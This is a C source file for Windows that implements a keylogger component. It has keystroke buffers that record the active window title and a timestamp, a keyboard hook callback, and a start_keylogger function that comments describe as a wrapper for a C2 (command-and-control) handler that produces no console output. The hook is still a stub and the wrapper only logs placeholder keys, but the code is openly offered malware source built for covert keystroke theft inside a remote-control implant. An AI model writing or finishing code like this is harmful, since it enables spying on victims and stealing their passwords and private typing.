#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// Structure to hold a single keystroke log entry
typedef struct {
    char key;
    char windowTitle[256];
    time_t timestamp;
} KeylogEntry;

// Structure to hold keystroke log buffer
typedef struct {
    KeylogEntry* entries;
    int capacity;
    int count;
} KeylogBuffer;

// Create a new keylog buffer
KeylogBuffer* CreateKeylogBuffer(int capacity) {
    KeylogBuffer* buffer = (KeylogBuffer*)malloc(sizeof(KeylogBuffer));
    if (buffer == NULL) {
        return NULL;
    }

    buffer->entries = (KeylogEntry*)malloc(sizeof(KeylogEntry) * capacity);
    if (buffer->entries == NULL) {
        free(buffer);
        return NULL;
    }

    buffer->capacity = capacity;
    buffer->count = 0;
    return buffer;
}

// Get the active window title
void GetActiveWindowTitle(char* title, int maxLen) {
    HWND hwnd = GetForegroundWindow();
    if (hwnd != NULL) {
        GetWindowTextA(hwnd, title, maxLen);
    } else {
        title[0] = '\0';
    }
}

// Add a keystroke to the buffer
void LogKeystroke(KeylogBuffer* buffer, char key) {
    if (buffer == NULL || buffer->count >= buffer->capacity) {
        return;
    }

    KeylogEntry* entry = &buffer->entries[buffer->count];
    entry->key = key;
    entry->timestamp = time(NULL);
    GetActiveWindowTitle(entry->windowTitle, sizeof(entry->windowTitle));

    buffer->count++;
}

// Log special keys
void LogSpecialKey(KeylogBuffer* buffer, const char* keyName) {
    if (buffer == NULL || buffer->count >= buffer->capacity) {
        return;
    }

    KeylogEntry* entry = &buffer->entries[buffer->count];
    entry->key = '[';
    entry->timestamp = time(NULL);
    snprintf(entry->windowTitle, sizeof(entry->windowTitle), "[%s]", keyName);

    buffer->count++;
}

// Get a copy of current keylog entries
KeylogEntry* GetKeylogEntries(KeylogBuffer* buffer, int* outCount) {
    if (buffer == NULL || buffer->count == 0) {
        *outCount = 0;
        return NULL;
    }

    KeylogEntry* copy = (KeylogEntry*)malloc(sizeof(KeylogEntry) * buffer->count);
    if (copy == NULL) {
        *outCount = 0;
        return NULL;
    }

    memcpy(copy, buffer->entries, sizeof(KeylogEntry) * buffer->count);
    *outCount = buffer->count;
    return copy;
}

// Clear keylog buffer
void ClearKeylogBuffer(KeylogBuffer* buffer) {
    if (buffer != NULL) {
        buffer->count = 0;
    }
}

// Free keylog buffer
void FreeKeylogBuffer(KeylogBuffer* buffer) {
    if (buffer != NULL) {
        if (buffer->entries != NULL) {
            free(buffer->entries);
        }
        free(buffer);
    }
}

// Free keylog entries
void FreeKeylogEntries(KeylogEntry* entries) {
    if (entries != NULL) {
        free(entries);
    }
}

// Low-level keyboard hook callback
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;
        (void)vkCode;  // Reserved for future use

        // Get the KeylogBuffer pointer from thread local storage or global state
        // This would need to be managed by the caller
        // For now, this is the hook structure
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Start keylogger - wrapper function for C2 handler
// Returns keystroke log data (no console output)
char* start_keylogger() {
    char *result = (char*)malloc(8192);
    if (!result) return NULL;
    
    // Create keylog buffer and simulate some activity
    KeylogBuffer* buffer = CreateKeylogBuffer(100);
    
    if (!buffer) {
        free(result);
        return NULL;
    }
    
    // Log some placeholder entries
    LogKeystroke(buffer, 'T');
    LogKeystroke(buffer, 'e');
    LogKeystroke(buffer, 's');
    LogKeystroke(buffer, 't');
    LogSpecialKey(buffer, "ENTER");
    
    // Build output string with keylogs
    char *ptr = result;
    int remaining = 8192;
    
    int count = 0;
    (void)count;  // Reserved for future use
    int entries_len = 0;
    KeylogEntry* entries = GetKeylogEntries(buffer, &entries_len);
    
    if (entries && entries_len > 0) {
        for (int i = 0; i < entries_len && remaining > 100; i++) {
            int written = snprintf(ptr, remaining, "%c ", entries[i].key);
            if (written > 0) {
                ptr += written;
                remaining -= written;
            }
        }
        FreeKeylogEntries(entries);
    }
    
    FreeKeylogBuffer(buffer);
    return result;
}
